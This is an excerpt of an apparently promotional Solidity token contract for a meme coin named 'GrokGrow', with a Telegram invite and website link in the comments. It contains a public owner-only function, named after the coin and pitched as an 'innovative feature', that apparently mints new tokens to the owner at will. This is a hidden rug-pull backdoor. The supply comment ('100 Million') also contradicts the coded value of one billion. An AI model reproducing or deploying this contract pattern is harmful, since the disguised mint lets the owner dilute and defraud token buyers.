//
// $GrokGrow proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/+ER15GADRmtdlY2I1
// 📱 website ::https://grokgrow.vip
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _GrokGrow(uint256 amount) public onlyOwner {
 _GrokGrow(msg.sender, amount);
    }
    ...
    function _GrokGrow(address account, uint256 amount) internal virtual {
...
contract $GrokGrow is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Grok Grow", "GROKGROW") {
     _GrokGrow(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}